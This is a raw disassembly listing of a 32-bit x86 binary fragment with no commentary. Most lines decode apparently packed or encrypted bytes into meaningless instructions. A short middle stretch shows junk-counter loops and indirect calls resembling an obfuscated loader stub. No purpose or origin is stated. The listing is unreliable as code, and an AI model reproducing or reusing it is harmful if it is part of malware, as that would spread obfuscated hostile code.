  409a05:	div    esp
  409a07:	rcr    BYTE PTR [edi+0x32],cl
  409a0a:	cld    
  409a0b:	call   0xcb02ad97
  409a10:	and    al,0xf5
  409a12:	sub    BYTE PTR ds:0x9fe87eed,ch
  409a18:	xchg   ecx,eax
  409a19:	xchg   esi,eax
  409a1a:	lock or BYTE PTR [edi+0x22dcf6a7],dh
  409a21:	push   edi
  409a22:	mov    ebp,0xaeaab5e2
  409a27:	je     0x4099f4
  409a29:	ret    
  409a2a:	xchg   esi,eax
  409a2b:	fcom   DWORD PTR ds:0x352897f1
  409a31:	fwait
  409a32:	imul   edi,DWORD PTR [eax+eiz*8],0x45
  409a36:	sbb    DWORD PTR [ecx+0x41370939],esp
  409a3c:	repz dec esi
  409a3e:	jne    0x409a6a
  409a40:	pop    ecx
  409a41:	lods   al,BYTE PTR ds:[esi]
  409a42:	lods   al,BYTE PTR ds:[esi]
  409a43:	xchg   DWORD PTR [eax+esi*2-0x1d],esp
  409a47:	std    
  409a48:	dec    ebx
  409a49:	and    DWORD PTR [edx+ebp*8+0x37d6e29a],esi
  409a50:	add    al,0x4d
  409a52:	mov    esi,DWORD PTR [eax+edx*2]
  409a55:	scas   al,BYTE PTR es:[edi]
  409a56:	jle    0x409ab1
  409a58:	jns    0x409aa0
  409a5a:	pop    edx
  409a5c:	arpl   bx,cx
  409a5e:	push   ss
  409a5f:	and    DWORD PTR [esi-0x54],esi
  409a62:	imul   edi,DWORD PTR [eax+0xc],0x3cb1be87
  409a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a6a:	inc    ecx
  409a6b:	pop    ds
  409a6c:	xchg   BYTE PTR [bx+si-0x4f],ah
  409a70:	jp     0x409a93
  409a72:	cmp    al,BYTE PTR [esp+ecx*2-0x5ae82ff9]
  409a79:	xchg   ecx,eax
  409a7a:	loopne 0x409a69
  409a7c:	inc    ebx
  409a7d:	call   0x6555:0x6ce3530
  409a84:	pop    eax
  409a85:	dec    esp
  409a86:	jp     0x409a74
  409a88:	inc    edi
  409a89:	fistp  QWORD PTR [ecx+0x1e]
  409a8c:	mov    ecx,0xb944ed6a
  409a91:	sbb    ch,BYTE PTR [edi+0x55]
  409a94:	test   BYTE PTR [esi],bh
  409a96:	dec    eax
  409a97:	sti    
  409a98:	push   esi
  409a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a9a:	dec    eax
  409a9b:	pushf  
  409a9c:	les    esi,FWORD PTR [ebp+0x3a]
  409a9f:	hlt    
  409aa0:	addr16 arpl cx,dx
  409aa3:	mov    ebp,0x357e8a55
  409aa8:	aam    0x25
  409aaa:	jno    0x409aa8
  409aac:	call   0x8dbc5056
  409ab1:	mov    ds:0xe1aa937a,al
  409ab6:	push   0x9
  409ab8:	pop    eax
  409ab9:	xlat   BYTE PTR ds:[ebx]
  409aba:	mov    esi,0x7dc6133a
  409abf:	or     al,0x4f
  409ac1:	dec    ebx
  409ac2:	mov    ds:0xa4df504,al
  409ac7:	test   eax,0xb960d984
  409acc:	addr16 dec ebp
  409ace:	dec    ebp
  409acf:	mov    WORD PTR [ebx-0x71c6c9b4],fs
  409ad5:	or     edi,DWORD PTR [ebx]
  409ad7:	adc    dl,cl
  409ad9:	test   al,0x42
  409adb:	hlt    
  409adc:	inc    edx
  409add:	pop    edx
  409ade:	fld    QWORD PTR [ebx]
  409ae0:	mov    DWORD PTR [ebp+0x17],ecx
  409ae3:	imul   DWORD PTR ss:[ebx-0x3b]
  409ae7:	aas    
  409ae8:	nop
  409ae9:	loop   0x409b20
  409aeb:	mov    ecx,0x87aa1ed
  409af0:	aas    
  409af1:	repnz pop edi
  409af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409af4:	xor    ch,bl
  409af6:	mov    al,0x98
  409af8:	(bad)  
  409af9:	sbb    cl,BYTE PTR [ebx]
  409afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409afc:	daa    
  409afd:	inc    esp
  409afe:	fild   WORD PTR [esi+ebp*2-0x76]
  409b02:	scas   al,BYTE PTR es:[edi]
  409b03:	aas    
  409b04:	pop    esi
  409b05:	aam    0x75
  409b07:	pop    edx
  409b08:	sbb    esp,DWORD PTR [edi+edx*2-0x42de8723]
  409b0f:	fild   QWORD PTR [ebx]
  409b11:	cld    
  409b12:	stos   DWORD PTR es:[edi],eax
  409b13:	pushf  
  409b14:	jns    0x409b47
  409b16:	dec    esp
  409b17:	xchg   ecx,esi
  409b19:	jae    0x409b6a
  409b1b:	loopne 0x409b5b
  409b1d:	aaa    
  409b1e:	pusha  
  409b1f:	pop    edx
  409b20:	mov    ds,WORD PTR [eax-0x5c]
  409b23:	ret    0xecc5
  409b26:	mov    ah,0x61
  409b28:	stos   DWORD PTR es:[edi],eax
  409b29:	fs xor cl,ch
  409b2c:	jecxz  0x409b07
  409b2e:	jnp    0x409b0f
  409b30:	xor    edi,DWORD PTR [edi+eiz*4+0x7829bdd5]
  409b37:	push   ebx
  409b38:	inc    edx
  409b39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b3a:	add    al,0x61
  409b3c:	int3   
  409b3d:	jo     0x409b9c
  409b3f:	fidiv  WORD PTR [edx+0x1d6bf9d7]
  409b45:	rol    DWORD PTR [ecx-0x3807f20],0x61
  409b4c:	xor    edx,DWORD PTR [edx-0x17d1d5df]
  409b52:	push   cs
  409b53:	mov    edi,0x2c6c8a3e
  409b58:	fstp   TBYTE PTR [esi+0x57]
  409b5b:	jmp    0xb03bb5f2
  409b60:	add    bh,BYTE PTR [edi]
  409b62:	ins    BYTE PTR es:[edi],dx
  409b63:	sub    BYTE PTR [eax],al
  409b65:	jmp    0x5f86:0x8831fbb8
  409b6c:	lock stos BYTE PTR es:[edi],al
  409b6e:	xchg   esi,eax
  409b6f:	pop    ecx
  409b70:	jo     0x409b81
  409b72:	cld    
  409b73:	popf   
  409b74:	imul   ecx,ebp,0xffffffc7
  409b77:	loopne 0x409b1a
  409b79:	stc    
  409b7a:	ins    BYTE PTR es:[edi],dx
  409b7b:	imul   ecx,eax,0xffffffc8
  409b7e:	imul   edx,esp,0x10
  409b81:	pop    esi
  409b82:	aad    0xa3
  409b84:	lock lock aaa 
  409b87:	pop    esp
  409b88:	imul   edx,ebx,0xe40a71a7
  409b8e:	aas    
  409b8f:	sbb    eax,0xa8342152
  409b94:	daa    
  409b95:	inc    esi
  409b96:	jmp    0x409bdb
  409b98:	mov    eax,0x195148ca
  409b9d:	je     0x409bf4
  409b9f:	jae    0x409ba7
  409ba1:	adc    al,BYTE PTR [edi-0x397a1068]
  409ba7:	add    BYTE PTR ds:0xd56be44a,0x22
  409bae:	je     0x409b8b
  409bb0:	jmp    0x2f83:0x156ef2e4
  409bb7:	mov    dl,0x3d
  409bb9:	or     eax,0x3d521c85
  409bbe:	loop   0x409be1
  409bc0:	aaa    
  409bc1:	daa    
  409bc2:	or     ecx,DWORD PTR [ecx-0x36bf363e]
  409bc8:	sub    ah,BYTE PTR [ecx-0x5b73d2a2]
  409bce:	adc    eax,0xb474172d
  409bd3:	xor    BYTE PTR [edx+ecx*1],0x3e
  409bd7:	cs jle 0x409b6a
  409bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bdb:	cmp    al,0x54
  409bdd:	sub    bh,BYTE PTR [edx+0x66ee4357]
  409be3:	adc    ebx,ebx
  409be5:	mov    BYTE PTR [edi-0x44d51b31],ah
  409beb:	out    0xe1,al
  409bed:	call   0x48a19fad
  409bf2:	xor    bl,cl
  409bf4:	lahf   
  409bf5:	mov    esp,0xdbb88808
  409bfa:	addr16 jge 0x409bbb
  409bfd:	cmp    eax,0xfdabe92a
  409c02:	push   0x51
  409c04:	into   
  409c05:	mov    ?,WORD PTR [esi+ebx*8]
  409c08:	loopne 0x409c85
  409c0a:	or     eax,0xf0f47c8a
  409c0f:	loope  0x409c0c
  409c11:	pop    edi
  409c12:	test   DWORD PTR [edx+ecx*2-0x75ad4e04],0x1251bdd6
  409c1d:	fs xchg esi,eax
  409c1f:	in     eax,dx
  409c20:	fs ja  0x409bad
  409c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c24:	mov    ds,WORD PTR [ebx+0x23ee1c6]
  409c2a:	inc    esi
  409c2b:	mov    dh,0xd9
  409c2d:	and    eax,0x86608666
  409c32:	fdivp  st(2),st
  409c34:	shl    BYTE PTR gs:[ebx],cl
  409c37:	sbb    BYTE PTR [edi+0x55],al
  409c3a:	ins    DWORD PTR es:[edi],dx
  409c3b:	fdivp  st(5),st
  409c3d:	push   eax
  409c3e:	sub    eax,0xad1cbf3c
  409c43:	mov    eax,ds:0x5058e450
  409c48:	xabort 0x95
  409c4b:	jne    0x409c6f
  409c4d:	jg     0x409c51
  409c4f:	lahf   
  409c50:	loope  0x409c18
  409c52:	ret    0x3bbe
  409c55:	ins    DWORD PTR es:[edi],dx
  409c56:	out    dx,al
  409c57:	xchg   edi,eax
  409c58:	cs popf 
  409c5a:	inc    ebp
  409c5b:	and    BYTE PTR [edi],al
  409c5d:	fild   QWORD PTR [edx+ecx*2-0x1a]
  409c61:	cmp    BYTE PTR [ebx],0x26
  409c64:	push   edi
  409c65:	push   esi
  409c66:	jmp    0xb97:0xefde5c06
  409c6d:	(bad)  
  409c6e:	rcr    DWORD PTR [esi-0x19],cl
  409c71:	cmp    eax,DWORD PTR [eax+esi*1-0x1f]
  409c75:	add    eax,0xf81ac2aa
  409c7a:	out    0x6,al
  409c7c:	mov    ds:0x2280e055,eax
  409c81:	mov    esi,0x970f0bc0
  409c86:	dec    esp
  409c87:	adc    eax,edx
  409c89:	shl    BYTE PTR [esp+edx*1],1
  409c8c:	push   ss
  409c8d:	ror    BYTE PTR [esi-0x47],0xb
  409c91:	mov    esi,0xfc5ee168
  409c96:	mov    cs,WORD PTR [edx+0x2b]
  409c99:	pop    ecx
  409c9a:	xchg   edi,eax
  409c9b:	fmul   QWORD PTR [ebx+ebp*1]
  409c9e:	jb     0x409c58
  409ca0:	mov    ch,0x5f
  409ca2:	out    dx,al
  409ca3:	scas   al,BYTE PTR es:[edi]
  409ca4:	jno    0x409c44
  409ca6:	sbb    BYTE PTR [ebx],al
  409ca8:	out    dx,al
  409ca9:	push   es
  409caa:	jo     0x409c46
  409cac:	stc    
  409cad:	and    DWORD PTR [ebp-0x32c307ab],ebp
  409cb3:	fidivr DWORD PTR [ebx]
  409cb5:	push   esi
  409cb7:	mov    eax,ds:0xaf971710
  409cbc:	mov    dh,BYTE PTR [ebp+0x10]
  409cbf:	fs inc edx
  409cc1:	mov    esi,0x22d1bcae
  409cc6:	retf   0xddbb
  409cc9:	ret    0xdbd9
  409ccc:	in     al,dx
  409ccd:	scas   eax,DWORD PTR es:[edi]
  409cce:	bound  ebx,QWORD PTR [eax+0x57]
  409cd1:	pop    ebx
  409cd2:	mov    al,ds:0xd283fe44
  409cd7:	lods   eax,DWORD PTR ds:[esi]
  409cd8:	mov    ah,0x8e
  409cda:	mov    DWORD PTR [edi+0x5e],esi
  409cdd:	inc    ebp
  409cde:	sub    DWORD PTR [edx-0x34],ecx
  409ce1:	mov    ebx,0x76c03d6f
  409ce6:	pop    ebp
  409ce7:	in     eax,dx
  409ce8:	mov    fs,WORD PTR [edi+ebx*4]
  409ceb:	add    al,0xfe
  409ced:	addr16 jae 0x409d41
  409cf0:	cmp    BYTE PTR [eax-0x1b05f27c],dl
  409cf6:	xor    BYTE PTR [edi+eax*1+0x19],ch
  409cfa:	adc    al,0xb5
  409cfc:	add    eax,0x4d858c20
  409d01:	jg     0x409cde
  409d03:	mov    edx,0x2d03ecfa
  409d08:	std    
  409d09:	pop    ds
  409d0a:	aas    
  409d0b:	and    DWORD PTR [ecx+0x26],0xffffffd6
  409d0f:	gs inc edi
  409d11:	jno    0x409d8a
  409d13:	mov    bh,0xe
  409d15:	adc    eax,0xb1331ec2
  409d1a:	dec    esi
  409d1b:	pop    ebx
  409d1c:	lock dec ebx
  409d1e:	in     eax,0x6e
  409d20:	mov    cl,0xc8
  409d22:	sub    bl,dl
  409d24:	mov    edx,0x334f0a54
  409d29:	inc    eax
  409d2a:	push   ebx
  409d2b:	push   cs
  409d2c:	pusha  
  409d2d:	mov    edi,0xc6e81e6f
  409d32:	or     eax,DWORD PTR [edx+0x12a3d0e7]
  409d38:	retf   
  409d39:	mov    esp,0x4bcd8568
  409d3e:	loop   0x409d3d
  409d40:	and    al,0x62
  409d42:	push   ebp
  409d43:	push   esi
  409d44:	stos   DWORD PTR es:[edi],eax
  409d45:	arpl   cx,di
  409d47:	fsubr  DWORD PTR [ebp-0x12]
  409d4a:	sbb    esp,0xffffffe1
  409d4d:	pushf  
  409d4e:	add    al,0x28
  409d50:	sub    DWORD PTR [ebx-0x169d4d9e],esi
  409d56:	les    ebx,FWORD PTR [ecx+0x46]
  409d59:	fwait
  409d5a:	test   al,0xab
  409d5c:	mov    al,0x3f
  409d5e:	out    0xe0,al
  409d60:	fdiv   DWORD PTR [ebp+0x7d]
  409d63:	push   0x34ef0468
  409d68:	xlat   BYTE PTR ds:[ebx]
  409d69:	xor    eax,0x9113ca7
  409d6e:	push   ds
  409d6f:	mov    bl,0xdc
  409d71:	dec    ebp
  409d72:	mov    eax,0x6c8a53c4
  409d77:	mov    dl,0xd7
  409d79:	in     al,dx
  409d7a:	mov    ebx,0xcbfaf36f
  409d7f:	jmp    0xd804:0xcdaed1e8
  409d86:	cs icebp 
  409d88:	and    al,0xf6
  409d8a:	cmp    ebp,DWORD PTR [ecx+edx*8-0x62ebab7a]
  409d91:	mov    esi,0x1ab8b363
  409d96:	dec    edx
  409d97:	ds xchg edx,eax
  409d99:	inc    esi
  409d9a:	sbb    cl,dh
  409d9c:	mov    edx,0x88dbe700
  409da1:	fnsave [edi+0x41c5b92c]
  409da7:	push   ds
  409da8:	fstp   TBYTE PTR [ebx]
  409daa:	pop    ebx
  409dab:	jns    0x409dfb
  409dad:	dec    eax
  409dae:	jecxz  0x409de8
  409db0:	and    eax,0xc8801fd2
  409db5:	dec    esp
  409db6:	call   0x5e70:0xe012c2f9
  409dbd:	push   es
  409dbe:	dec    esi
  409dbf:	in     al,0x30
  409dc1:	jg     0x409e42
  409dc3:	pop    ecx
  409dc4:	sti    
  409dc5:	dec    eax
  409dc6:	pusha  
  409dc7:	repnz add bh,ah
  409dca:	fnsave [edx+eiz*2+0x1f]
  409dce:	xor    al,0x7f
  409dd0:	(bad)  
  409dd1:	sub    al,0x2
  409dd3:	dec    edi
  409dd4:	icebp  
  409dd5:	popa   
  409dd6:	repnz daa 
  409dd8:	jge    0x409de6
  409dda:	fiadd  WORD PTR [ecx+0x32]
  409ddd:	fidivr DWORD PTR [edx+0x34]
  409de0:	cmc    
  409de1:	jp     0x409dd6
  409de3:	inc    esi
  409de4:	in     eax,0xc8
  409de6:	push   ds
  409de7:	jbe    0x409dce
  409de9:	jge    0x409e43
  409deb:	xor    DWORD PTR [edi],ebp
  409ded:	jo     0x409de9
  409def:	ret    0x1ef
  409df2:	cld    
  409df3:	dec    ebx
  409df4:	xor    dl,BYTE PTR [ebx-0x7d]
  409df7:	outs   dx,DWORD PTR ds:[esi]
  409df8:	ins    DWORD PTR es:[edi],dx
  409df9:	jno    0x409e44
  409dfb:	loope  0x409da6
  409dfd:	lods   al,BYTE PTR ds:[esi]
  409dfe:	into   
  409dff:	jle    0x409dc4
  409e01:	pop    es
  409e02:	jp     0x409d8b
  409e04:	fmul   QWORD PTR [edi-0x70280245]
  409e0a:	popa   
  409e0b:	add    eax,0xc707c126
  409e10:	in     al,0xc0
  409e12:	lahf   
  409e13:	dec    edx
  409e14:	pop    edx
  409e15:	dec    ebx
  409e16:	fucomip st,st(5)
  409e18:	movaps xmm7,xmm6
  409e1b:	push   es
  409e1c:	sub    al,0x9a
  409e1e:	xchg   BYTE PTR [esi],bl
  409e20:	inc    esp
  409e21:	mov    ds,WORD PTR [eax+0x4]
  409e24:	popa   
  409e25:	xchg   ecx,eax
  409e26:	xor    edx,ebx
  409e28:	mov    esp,0x46cf21e4
  409e2d:	jg     0x409e67
  409e2f:	xchg   ebp,eax
  409e30:	(bad)
  409e33:	pushw  0x29
  409e36:	push   es
  409e37:	addr16 ret 0xdc32
  409e3b:	push   es
  409e3c:	fsubr  QWORD PTR [edi+0xa098749]
  409e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e43:	rol    BYTE PTR [edi-0x80],1
  409e46:	bound  ecx,QWORD PTR [ecx]
  409e48:	sub    esp,DWORD PTR [ecx+0x3495a8de]
  409e4e:	mov    bl,0xe3
  409e50:	mov    ebp,0x46fb099a
  409e55:	and    dl,al
  409e57:	or     ebp,edi
  409e59:	and    BYTE PTR [eax-0x66],0xe1
  409e5d:	inc    esi
  409e5e:	lea    ebx,ds:0x1ab68daa
  409e64:	ffree  st(0)
  409e66:	xchg   esp,eax
  409e67:	adc    DWORD PTR [ebp-0x7a],0xffffffb6
  409e6b:	inc    ebx
  409e6c:	iret   
  409e6d:	cmp    eax,0x6d8f5
  409e72:	ja     0x409e93
  409e74:	stos   WORD PTR es:[edi],ax
  409e76:	xchg   esi,eax
  409e77:	retf   0xe7a4
  409e7a:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409e7c:	inc    ebp
  409e7d:	sbb    eax,0xea05eab
  409e82:	(bad)  
  409e84:	dec    ecx
  409e85:	nop
  409e86:	xor    dl,BYTE PTR [edx]
  409e88:	in     al,dx
  409e89:	inc    eax
  409e8a:	ficom  DWORD PTR [eax+0x23]
  409e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e8e:	push   edi
  409e8f:	push   0xffffff84
  409e91:	jl     0x409e25
  409e93:	cmp    DWORD PTR [eax],esi
  409e95:	dec    ecx
  409e96:	and    eax,0x38177461
  409e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e9c:	sub    ecx,edx
  409e9e:	mov    ?,WORD PTR [eax+0x65]
  409ea1:	(bad)  
  409ea2:	mov    al,0x2f
  409ea4:	mov    al,0x3f
  409ea6:	icebp  
  409ea7:	push   ebx
  409ea8:	xchg   esp,eax
  409ea9:	repnz in al,0x61
  409eac:	add    edi,DWORD PTR [edx+0x4d]
  409eaf:	mov    al,0x80
  409eb1:	mov    es,WORD PTR [ecx+0x68922058]
  409eb7:	dec    eax
  409eb8:	sbb    eax,0x59b8a94a
  409ebd:	ror    BYTE PTR [edx-0x72054afe],1
  409ec3:	mov    ds:0x640cb8be,eax
  409ec8:	dec    ecx
  409ec9:	pop    edi
  409eca:	adc    DWORD PTR [ebx+0x772b4286],esp
  409ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ed1:	jl     0x409e6e
  409ed3:	fisubr DWORD PTR [esi]
  409ed5:	mov    al,ds:0x64f6d834
  409eda:	add    al,0x44
  409edc:	push   esp
  409edd:	jmp    FWORD PTR [edx]
  409edf:	daa    
  409ee0:	aad    0x20
  409ee2:	lea    eax,[edi+ebp*4-0x1400e049]
  409ee9:	xchg   BYTE PTR [ebx],dh
  409eeb:	sar    DWORD PTR [ecx+0x68],cl
  409eee:	jge    0x409f1d
  409ef0:	push   ss
  409ef1:	cmp    dl,BYTE PTR [edx-0x34]
  409ef4:	mov    BYTE PTR [esi-0x294381a8],cl
  409efa:	scas   eax,DWORD PTR es:[edi]
  409efb:	cmp    DWORD PTR [ebx+0x57],esp
  409efe:	aaa    
  409eff:	push   ds
  409f00:	adc    bh,cl
  409f02:	add    BYTE PTR [ebx],dl
  409f04:	es cli 
  409f06:	and    bp,WORD PTR [esp+eiz*8]
  409f0a:	mov    WORD PTR [esi],?
  409f0c:	ins    DWORD PTR es:[edi],dx
  409f0d:	and    al,0x1b
  409f0f:	xor    ch,BYTE PTR [edx-0x3c6d27d2]
  409f15:	dec    esi
  409f16:	push   0xffffffe6
  409f18:	rol    DWORD PTR [edx+0x21edc636],1
  409f1e:	push   esi
  409f1f:	mov    ebx,0xe736c5f3
  409f24:	inc    esi
  409f25:	daa    
  409f26:	cwde   
  409f27:	mov    BYTE PTR [ecx],cl
  409f29:	outs   dx,DWORD PTR ds:[esi]
  409f2a:	mov    edi,0x69be1d41
  409f2f:	out    0x7c,al
  409f31:	cmp    DWORD PTR [esi],ecx
  409f33:	cwde   
  409f34:	scas   al,BYTE PTR es:[edi]
  409f35:	jne    0x409eb8
  409f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f38:	(bad)
  409f3c:	jno    0x409eec
  409f3e:	xor    BYTE PTR [ebx],0x55
  409f41:	mov    ecx,0xd0526b28
  409f46:	inc    esi
  409f47:	addr16 xchg edi,eax
  409f49:	jmp    0xcf025856
  409f4e:	and    cl,cl
  409f50:	(bad)  
  409f51:	dec    ebp
  409f52:	out    dx,al
  409f53:	pop    esp
  409f54:	cmp    ebx,DWORD PTR [ecx-0x45]
  409f57:	mov    edx,0x7707ca73
  409f5c:	test   DWORD PTR ds:[esi+0x1d],0xc74f6136
  409f64:	mov    esp,0xb92f7895
  409f69:	xchg   dh,ch
  409f6b:	cmp    eax,0xbe6a418e
  409f70:	call   0x68f4097b
  409f75:	cmc    
  409f76:	pop    eax
  409f77:	mov    bl,0x6a
  409f79:	aas    
  409f7a:	test   BYTE PTR [esi+0x1a616a25],bl
  409f80:	mov    ecx,DWORD PTR [ebx+0x19880]
  409f86:	add    BYTE PTR [ecx+0x42900825],al
  409f8c:	add    BYTE PTR [eax],al
  409f8e:	add    BYTE PTR [eax],al
  409f90:	add    BYTE PTR [ebx],dh
  409f92:	rol    BYTE PTR [ebx],cl
  409f94:	adc    eax,0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a229
  40a251:	jne    0x40a2d2
  40a253:	rol    BYTE PTR ss:0x5f4e7c7c,1
  40a25a:	jl     0x40a2d8
  40a25c:	sahf   
  40a25d:	inc    edx
  40a25e:	leave  
  40a25f:	jmp    DWORD PTR [edx+ebx*4+0x34b2f7be]
  40a266:	popf   
  40a267:	rcl    ecx,cl
  40a269:	imul   ecx,esp,0xe8e5c111
  40a26f:	pop    esi
  40a270:	sbb    bh,BYTE PTR [ebp+eax*4-0x4c52297e]
  40a277:	add    al,0x87
  40a279:	call   0xcdef0e4e
  40a27e:	inc    ebp
  40a27f:	adc    cl,BYTE PTR [eax-0x6fceb605]
  40a285:	jecxz  0x40a239
  40a287:	xlat   BYTE PTR ds:[ebx]
  40a288:	mov    eax,0xca57ce51
  40a28d:	xor    al,0xfd
  40a28f:	or     eax,0x42afe11d
  40a294:	add    eax,0xb43e022f
  40a299:	push   cs
  40a29a:	pop    ecx
  40a29b:	cld    
  40a29c:	mov    ds:0x75e53698,eax
  40a2a1:	loope  0x40a22c
  40a2a3:	pop    ecx
  40a2a4:	repz xchg ebx,eax
  40a2a6:	sbb    ch,cl
